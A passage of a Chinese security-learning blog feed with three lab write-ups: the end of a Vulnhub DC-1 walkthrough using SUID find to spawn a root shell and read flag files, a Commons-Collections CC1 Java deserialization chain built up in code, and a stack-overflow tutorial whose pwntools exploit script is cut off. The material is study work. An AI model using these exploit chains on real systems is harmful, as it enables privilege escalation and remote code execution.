蛮力和字典攻击不是获得访问权限的唯一途径 (您将需要访问权限)您可以使用这些凭据做什么和数据库账号密码，那就上数据库看看咯</p><p><img src="/2023/05/12/DC-1/image-20231128200151432.png"></p><p>密码被加密了，还加了salt，但是drupal的script文件夹下有salt算法的php文件，可以直接加密admin的值更新一下密码</p><p><img src="/2023/05/12/DC-1/image-20231128200352123.png"></p><p>拿算出来的值更新密码</p><p><img src="/2023/05/12/DC-1/image-20231128200456910.png" alt="image-20231128200456910">修改成功，去尝试登录，登录后可以看到flag3</p><p><img src="/2023/05/12/DC-1/image-20231128200543356.png"></p><p>flag3的提示需要shadow中的内容，直接先提权到root权限再去查看flag的信息，利用SUID</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token comment">#suid权限就是4000 ，从、目录中查找具有SUID权限</span>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。<span class="token function">touch</span> <span class="token builtin class-name">test</span><span class="token function">find</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span class="token function">find</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> <span class="token string">'\bin\bash'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span class="token comment">#进入shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用find进行提权，和查看flag4和finalflag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> flag1.txt <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /home/flag4/flag4.txt <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/05/12/DC-1/image-20231128200935076.png" alt="image-20231128200935076"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> flag1.txt <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /root/thefinalflag.txt <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/05/12/DC-1/image-20231128200946828.png" alt="image-20231128200946828"></p><h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>SUID(Set UID)是Linux系统中一种特殊的权限，SUID 位：当二进制文件设置了 SUID 位时，它由文件权限的所有者权限部分中的“s”表示，如“rwsr-xr-x”。“s”也可以是“S”（大写），表示 SUID 位已设置，但没有所有者的执行权限。SUID 授权可用于允许普通用户执行需要提升权限的特定命令，而无需授予他们完全的超级用户访问权限。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> u+s filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> u-s filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>来寻找拥有SUID权限的文件<br>如果有find，可通过<code>find user -exec /bin/sh \; -quit</code>脱离环境<br>更多的命令请参考<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://tuzk1.top/posts/b4fda4fc.html#toc-heading-5">Vulnhub靶机系列: DC-1 | Tuzk1</a></p>]]></content>
      
      
      <categories>
          
          <category> DC-1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链分析</title>
      <link href="/2023/04/16/CC1/"/>
      <url>/2023/04/16/CC1/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>  在b站刷到了白日梦组长师傅的cc链讲解，想自己上手尝试尝试。<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=285e0dd283ec34ca677ad8e8ff5c4fe0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=285e0dd283ec34ca677ad8e8ff5c4fe0</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="jdk及其源码"><a href="#jdk及其源码" class="headerlink" title="jdk及其源码"></a>jdk及其源码</h3><p>jdk ：<a href="https://www.oracle.com/sg/java/technologies/javase/javase8-archive-downloads.html%E4%B8%8B%E8%BD%BD">https://www.oracle.com/sg/java/technologies/javase/javase8-archive-downloads.html下载</a> 8u65</p><p>下载 jdk源码并导入 <a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>下载后解压</p><p><img src="/2023/04/16/CC1/image-20230731192011258.png"></p><p>在src&#x2F;share&#x2F;classes&#x2F;中有个sun,把这个文件夹导入到jdk中</p><p><img src="/2023/04/16/CC1/image-20230731192124323.png"></p><p>把src解压，放入sun</p><p><img src="/2023/04/16/CC1/image-20230731192144886.png"></p><p>在idea中的项目结构</p><p><img src="/2023/04/16/CC1/image-20230731192216997.png"></p><p>导入src</p><p><img src="/2023/04/16/CC1/image-20230731192258096.png"></p><p>在idea中就可以看到jdk源码</p><p><img src="/2023/04/16/CC1/image-20230731192402630.png"></p><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>在项目文件pom.xml中添加</p><p><img src="/2023/04/16/CC1/image-20230731192459541.png"></p><p>添加maven3.2.1</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/16/CC1/image-20230731192730037.png"></p><p>配置完成</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>作者在maven 3.2.1中发现有一个Transformer类（idea中ctrl+alt+B查看实现类）</p><p><img src="/2023/04/16/CC1/image-20230801010249108.png"></p><p>选择看看NOPTransformer</p><p><img src="/2023/04/16/CC1/image-20230801010855943.png"></p><p>发现啥也没干，传一个imput 返回一个input，<strong>在CC1当中主要还是看InvokerTransformer</strong></p><p><img src="/2023/04/16/CC1/image-20230801011414662.png"></p><p>可以看到InvokerTransformer当中反射调用了invoke()。利用反射弹出计算器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token comment">//        Runtime.getRuntime().exec("calc");</span>            <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runtime</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token comment">//获取一个RUNtime.class</span>        <span class="token class-name">Method</span> execMethod <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取他的exec方法</span>        execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在r这个对象上反射调用弹个计算器</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下改成InvokerTransformer的写法，查看InvokerTransformer的构造函数，接受参数名，参数类型，参数值</p><p><img src="/2023/04/16/CC1/image-20230803132317898.png"></p><p>还要调用到transformer</p><p><img src="/2023/04/16/CC1/image-20230803132727438.png"></p><p>那么<code>new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).teansform(r);</code> 根据参入的参数能够弹出计算器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token comment">//        Runtime.getRuntime().exec("calc");</span>        <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Class&lt;Runtime> c = Runtime.class;</span><span class="token comment">//        Method execMethod = c.getMethod("exec", String.class);</span><span class="token comment">//        execMethod.invoke(r,"calc");</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要找到调用了transform方法的类（idea快捷键 给变量添加类型alt+ctrl+v，右键查找用法可以看到哪些方法调用了transform）</p><p><img src="/2023/04/16/CC1/image-20230801123841050.png"></p><p>可以看到map类中DefaultedMap和LazyMap、TransformedMap调用了Transform，在TransformedMap中调用的比较多，就用TransformedMap入手</p><p><img src="/2023/04/16/CC1/image-20230801124238610.png"></p><p>在checkSetValue中返回了valueTransformer.transform，去看一下他的构造函数，是个protected会被自己调用</p><p><img src="/2023/04/16/CC1/image-20230801125402276.png"></p><p>因为是个保护方法看看那里调用了TransformedMap</p><p><img src="/2023/04/16/CC1/image-20230802205054498.png"></p><p>在上面有个静态方法decorate()中调用了，在TransformedMap.decorate()中返回调用了TransformedMap();</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token class-name">Map</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap  <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在根据checkValue()函数中的返回结果，可以堪称返回为invokerTransformer.Transform(value),成功的调用到transform，现在要调用checkSetvalue(Object value)，就可以调用transform</p><p><img src="/2023/04/16/CC1/image-20230802205737980.png"></p><p>找到checkSetvalue()的调用，在AbstractInputCheckedMapDecorator类中，其实是TransformedMap的一个父类，是个抽象类，在AbstractInputCheckedMapDecorator中有个MapEntry类调用了setValue方法。由于使用该方法的类较多，不好找。而MapEntry是HashMap遍历的时候的键值对，一个键值对就是一个Entry。而setValue就是使用了entry.setValue()</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//给map赋值</span><span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decrate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">:</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等价于invokerTransformer.Transform(r)  </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="梳理过程"><a href="#梳理过程" class="headerlink" title="梳理过程"></a>梳理过程</h4><p>到此处证明这条链是可以用的从<code>InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code> 通过寻找不同类的transform方法到 <code> TransformedMap.checkSetValue(Object value)&#123;valueTransformer.transform(value)&#125;</code>  在使用TransforedMap的checkSetValue()的方法需要通过decorate()函数对transform()中的valueTransformer进行赋值</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token class-name">Map</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap  <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过传入参数构造成</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过decorate的赋值此时为，InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;).transform(value);</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只要调用checkSetValue();就会触发，Entry中的setValue就有调用checkSetvalue方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            value <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>需要invokerTransformer.transform(r);</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">:</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等价于InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;).Transform(r);  </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>完整的代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1Test</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;).transform(r);</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token class-name">Map</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap  <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">:</span>transformedMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果有个遍历Map的地方调用setValue(),就可以调用InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”}).Transform(r); 最好是找在谁的readObject中有setValue();就可以直接序列化。</p><p>在”sun.reflect.annotation”的AnnotationInvocationHandler类中的readObject()中有一个遍历Map的地方调用了setValue();</p><p><img src="/2023/04/16/CC1/image-20230803152216064.png"></p><p> 看AnnotationInvocationHandler的构造函数</p><p><img src="/2023/04/16/CC1/image-20230808214304423.png"></p><p>接受两个参数，第一个是type,第二个是Map。只能用反射去获取</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> annotationInvocationhandlerConstructor <span class="token operator">=</span>      c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>annotationInvocationhandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Object</span>  o <span class="token operator">=</span> annotationInvocationhandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还剩一个问题</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC链 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2023/03/18/stack%20overflow/"/>
      <url>/2023/03/18/stack%20overflow/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出-stack-overflow"><a href="#栈溢出-stack-overflow" class="headerlink" title="栈溢出(stack overflow)"></a>栈溢出(stack overflow)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​在b站刷到的【星盟安全】PWN全集<a href="https://www.bilibili.com/video/BV1Uv411j7fr/?spm_id_from=333.337.search-card.all.click&vd_source=285e0dd283ec34ca677ad8e8ff5c4fe0%EF%BC%8C%E4%BD%9C%E4%B8%BA%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%82">https://www.bilibili.com/video/BV1Uv411j7fr/?spm_id_from=333.337.search-card.all.click&amp;vd_source=285e0dd283ec34ca677ad8e8ff5c4fe0，作为我的学习记录。</a></p><p>​在我们编写程序的时候通常会把功能点封装成函数方便调用，编写完成后由编译器进行编译连接后形成可执行文件。但是内存和cpu可不懂编程语言，那么函数进入到内存后是怎样被识别并通过cpu进行运算的？</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>​内存是一块连续的空间，当有程序运行时就会在内存获取一段逻辑意义上连续的空间作为函数调用栈，为什么要用栈呢？栈是一种特殊的结构，先进后出是栈的特点，但是我们在编程的时候都知道了程序是一行一行执行的为什么到这就需要先进后出了呢？在我们编写c语言代码的时候都知道程序的入口是main函数，在main函数当中有f1()和f2()两个函数</p><p>![](stack overflow&#x2F;image-20230305213357260.png)</p><p>在这我们可以看出main函数去调用了f1(),f1()又去调用了f2()，然而内存是按低地址向高地址生长的，程序的执行过程也是这样，所以这里我们就需要使用到栈的结构类型，栈是由高地址向低地址生长的，用到了栈结构之后</p><p>![](stack overflow&#x2F;image-20230305214039317.png)</p><p>当我们在main()函数中需要去调用别的函数时，main()函数的状态就会被保存在函数调用栈中，被调用的函数则会被压入栈中，f1()也是同样的情况，在函数调用结束后被弹出。然而每个函数在调用栈中会分配到部分空间成为<strong>栈帧</strong>，每一个栈帧的结构都相同，</p><p>![](stack overflow&#x2F;image-20230305225140042.png)</p><p>调用函数时，会将被调用函数的状态和变量压入栈中，之后会将调用完函数的下一条命令的地址压入栈中作为返回地址，再将调用函数的栈帧地址压入栈中方便恢复调用函数的栈，再将被调用函数的局部变量压入栈中，通常栈溢出发生在局部变量的位置，没控制好局部变量的长度是可以覆盖到返回地址的。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>首先我们checksec一下overflow看他有什么保护</p><p>![](stack overflow&#x2F;image-20230306001532731.png)</p><p>打开ida看看</p><p>![](stack overflow&#x2F;image-20230306001908922.png)</p><p>只有一个gets()函数，给v4变量赋值，gets()函数是一个危险函数，可以输入任意长度的内容，有gets()一定有溢出</p><p>![](stack overflow&#x2F;image-20230306002323009.png)</p><p>看到var_10是v4，s和r分别是ebp，返回地址，我们要覆盖的目标是r，可以看出v4的地址是-10h，那么我们传入18h的数据刚好覆盖到r地址</p><p>![](stack overflow&#x2F;image-20230306001951953.png)</p><p>在左侧的函数列表中还有一个backdoor函数</p><p>![](stack overflow&#x2F;image-20230306002200516.png)</p><p>可以看出是一个返回了一个shell，这样我们可以通过main函数当中的v4栈帧中的返回地址指向backdoor函数就可以获得一个shell</p><p>![](stack overflow&#x2F;image-20230306002759288.png)</p><p>查看backdoor函数的地址，然后编写脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"overflow"</span><span class="token punctuation">)</span> <span class="token operator">//</span>获取overflow进程backdoor<span class="token operator">=</span><span class="token number">0x400677</span> <span class="token operator">//</span>后面地址payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span> <span class="token operator">//</span>长度为18h的字符a，后面跟上<span class="token number">64</span>位的后门地址p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your suggestion:"</span><span class="token punctuation">)</span><span class="token operator">//</span>当程序出现Your suggestion<span class="token 